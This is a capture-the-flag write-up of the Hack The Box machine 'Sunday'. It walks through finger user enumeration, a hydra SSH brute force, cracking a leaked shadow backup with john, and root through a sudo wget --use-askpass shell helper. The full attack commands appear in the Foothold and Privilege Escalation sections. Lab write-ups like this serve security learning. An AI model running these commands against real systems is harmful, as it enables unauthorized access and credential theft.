# Sunday — Easy — Solaris

**Date:** 17 June 2026

---

## Tags
`#solaris` `#finger` `#user-enumeration` `#hydra` `#weak-creds` `#password-cracking` `#sudo-wget` `#gtfobins` `#privesc`

---

## What I Know

| Item       | Detail                                                       |
| ---------- | ------------------------------------------------------------ |
| Target     | 10.129.17.203                                                |
| OS         | Solaris (Sun)                                                |
| Open ports | 79, 111, 515, 6787, 22022                                    |
| Services   | finger, rpcbind, LPD printer, Apache (6787), SSH on 22022    |
| Users      | sunny, sammy (enumerated via finger)                         |
| Foothold   | finger user-enum → hydra brute force → SSH as sunny          |
| Privesc    | shadow backup → crack sammy → sudo wget (NOPASSWD) → root    |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.17.203

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-17 10:11 +0100
Warning: 10.129.17.203 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.17.203
Host is up (0.016s latency).
Not shown: 59661 filtered tcp ports (no-response), 5869 closed tcp ports (reset)
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
515/tcp   open  printer
6787/tcp  open  smc-admin
22022/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 147.97 seconds
```

<img width="1043" height="396" alt="image" src="https://github.com/user-attachments/assets/67e9c0d6-b4c6-4fa4-91c4-7f98c8678822" />

```
nmap -sC -sV -p79,111,515,6787,22022 10.129.17.203

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-17 10:18 +0100
Nmap scan report for 10.129.17.203
Host is up (0.017s latency).

PORT      STATE SERVICE VERSION
79/tcp    open  finger?
|_finger: No one logged on\x0D
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)

(Full port-79 service fingerprint omitted for brevity)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.87 seconds
```

<img width="2206" height="1169" alt="image" src="https://github.com/user-attachments/assets/ab8d15c0-4454-4852-95ec-270faf3eee70" />

**What each port tells me:**
- **Port 79 (finger)** — a legacy Unix service that reports who is logged in and basic account info. This is my primary enumeration surface: I can use it to discover valid usernames.
- **Port 111 (rpcbind)** — the RPC portmapper. It maps RPC program numbers to ports; on its own it's mostly informational here, though it confirms a classic Unix/Solaris host.
- **Port 515 (LPD)** — the legacy line-printer daemon for queuing print jobs. Old and occasionally exploitable, but not promising on this box; low priority.
- **Port 6787 (HTTP / smc-admin)** — Apache serving the Solaris Management Console admin interface. Returns 400 on a plain request; a possible secondary avenue (and a place to confirm the OS version), but not the main path.
- **Port 22022 (SSH)** — SSH on a non-standard port. This is how I'll get in once finger gives me usernames and I recover a password.

---

## Enumeration Log

```
OBSERVATION: Port 79 (finger) is open
WHAT IT TELLS ME:
- This is a service I haven't used much; quick research shows finger can enumerate users on a Unix host
WHAT I AM GOING TO TRY:
- Use the techniques from https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger to query the service
WHY: To retrieve valid usernames on the system
RESULT:
- Using finger-user-enum (https://pentestmonkey.net/tools/user-enumeration/finger-user-enum)
  I found two interesting users: sunny and sammy (other names appeared, but these two had
  a "When" login record, making them look like real, active accounts)
WHAT NEXT:
- Attempt a password brute force against SSH for these users
```

<img width="1742" height="548" alt="image" src="https://github.com/user-attachments/assets/c5550ddf-0785-496c-933f-b0c5a69d2bc9" />

<img width="1357" height="40" alt="image" src="https://github.com/user-attachments/assets/25635773-ebd3-413b-b2b5-551bca1ff72f" />

<img width="1424" height="57" alt="image" src="https://github.com/user-attachments/assets/e65155b7-03e1-4d08-bb82-db3b9ac76ac5" />


```
OBSERVATION:
- Brute forcing with hydra found sunny's password: "sunday"
- (In hindsight I could simply have tried the box name as the password, a common HTB pattern)
WHAT IT TELLS ME: I can use these credentials to SSH in
WHAT I AM GOING TO TRY: SSH to port 22022 as sunny
WHY: To get a foothold and read user.txt
RESULT:
- Logged in as sunny over SSH, but user.txt lives in sammy's home directory and sunny can't read it
WHAT NEXT: Enumerate the system to find a way to move laterally to sammy
```

<img width="1189" height="414" alt="image" src="https://github.com/user-attachments/assets/15d62489-9a34-4a90-9f1e-19ce86db9a58" />

<img width="1344" height="402" alt="image" src="https://github.com/user-attachments/assets/f5851dde-eebe-4f99-a661-cc0018bdc6dc" />

<img width="588" height="57" alt="image" src="https://github.com/user-attachments/assets/66cab5ea-ee24-430a-a50c-6dafbca380d9" />

```
OBSERVATION:
- Shell history showed a previous user accessed /backup/shadow.backup
WHAT IT TELLS ME: That file is worth reading, shadow files hold password hashes
WHAT I AM GOING TO TRY: Read /backup/shadow.backup
WHY: Because a backed-up shadow file likely contains hashed user passwords
RESULT: The file contained password hashes for both users
WHAT NEXT: Crack the hashes offline
```

<img width="551" height="306" alt="image" src="https://github.com/user-attachments/assets/bbde08c8-dd3d-4925-bd51-bac9090e7c0b" />

<img width="945" height="279" alt="image" src="https://github.com/user-attachments/assets/db2306a9-55d4-4bfe-ad23-145666a51c93" />

```
OBSERVATION: Cracked sammy's password from the hash using john
WHAT IT TELLS ME: I can now move laterally to sammy
WHAT I AM GOING TO TRY: Switch to sammy (su / SSH)
WHY: To read user.txt
RESULT: Became sammy and read user.txt
WHAT NEXT: Enumerate as sammy for a path to root
```

<img width="966" height="103" alt="image" src="https://github.com/user-attachments/assets/1d4dc77f-4b70-47d5-ac71-348a0f6f8777" />

<img width="486" height="83" alt="image" src="https://github.com/user-attachments/assets/6693ade5-73ac-4b69-8981-7fcd71e7be6c" />

<img width="1248" height="314" alt="image" src="https://github.com/user-attachments/assets/18248e60-c66a-4bbc-846f-75f903307c55" />

<img width="406" height="52" alt="image" src="https://github.com/user-attachments/assets/b532385e-3690-4e28-b6d8-0fb990535cfa" />

```
OBSERVATION: sudo -l shows sammy may run wget as root without a password (NOPASSWD)
WHAT IT TELLS ME: wget under sudo is a GTFOBins privesc. Its --use-askpass option runs an
  external helper program to fetch credentials, so if I point it at my own script, wget
  executes that script as root
WHAT I AM GOING TO TRY:
- Write a tiny helper script that spawns /bin/sh, then run sudo wget --use-askpass=<script>
WHY: wget is run as root via sudo, so any program it executes (the askpass helper) also runs as root
RESULT: wget executed my helper as root, giving a root shell and read root.txt
```

<img width="712" height="73" alt="image" src="https://github.com/user-attachments/assets/49d790ac-7973-4028-983e-85c75794b67b" />

<img width="1037" height="401" alt="image" src="https://github.com/user-attachments/assets/746b8fc1-88de-4de1-938b-08f741982aeb" />

<img width="976" height="54" alt="image" src="https://github.com/user-attachments/assets/88af85a7-f13f-4fa4-8100-d2ba7415d82b" />

<img width="867" height="124" alt="image" src="https://github.com/user-attachments/assets/22e53269-cab5-4814-9681-1b4f3d955068" />

---

## Foothold

**How I got in:** The finger service on port 79 let me enumerate valid system users without any credentials, returning sunny and sammy. I then brute-forced SSH (on the non-standard port 22022) with hydra and found sunny's password was simply `sunday` the box name. That gave an SSH foothold as sunny.

**Command / exploit used:**
```
# enumerate users via finger
finger-user-enum.pl -U /usr/share/wordlists/names.txt -t 10.129.17.203
# brute force SSH on the custom port
hydra -l sunny -P /usr/share/wordlists/rockyou.txt ssh://10.129.17.203:22022
ssh sunny@10.129.17.203 -p 22022      # password: sunday
```

**Why it worked:** Finger is an obsolete information-disclosure service that should never be exposed, it freely confirmed which usernames exist, removing the guesswork from the attack. Combined with a trivially weak, guessable password (the machine's own name), unauthenticated user enumeration turned straight into authenticated access.

---

## Privilege Escalation

**Path taken (sunny → sammy → root):**

1. **Lateral move via a leaked shadow backup.** sunny's shell history referenced `/backup/shadow.backup`. That file, a stray backup of the system shadow file, was readable and contained the password hashes for both users. I cracked sammy's hash offline with john, switched to sammy, and read user.txt.
2. **Root via sudo wget (NOPASSWD).** `sudo -l` as sammy showed wget could be run as root without a password. The GTFOBins entry for wget includes an `--use-askpass` technique: wget invokes the program given to `--use-askpass` as a helper subprocess to retrieve credentials. By pointing it at a small script that just spawns a shell, wget executes that script and because wget is running as root via sudo, the spawned shell is a **root** shell. I created the helper, made it executable, ran wget with `--use-askpass`, and got root, then read root.txt.

```
# create the askpass helper that spawns a shell
echo -e '#!/bin/sh\n/bin/sh 1>&0' > /tmp/shell.sh
chmod +x /tmp/shell.sh
# wget runs the helper as root → root shell
sudo /usr/bin/wget --use-askpass=/tmp/shell.sh 0
# id → uid=0(root)
```

**Why it worked:** Two failures of credential and configuration hygiene. First, a backup shadow file was left readable outside its normal protected location, exposing sammy's hash for offline cracking. Second, a `NOPASSWD` sudo grant on wget let it run as root and wget's `--use-askpass` option will execute any program it's handed, so a root-run wget becomes arbitrary code execution as root. The helper script is the payload; sudo supplies the privilege.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Enumerated users through the exposed finger service, then brute-forced SSH with hydra to log in as sunny using the box-name password "sunday".
2. **Privesc technique in one sentence:** Read a leaked `/backup/shadow.backup` to crack sammy's hash with john, then abused a `NOPASSWD` sudo grant on wget using `--use-askpass` to run a shell-spawning helper script as root to get a root shell.
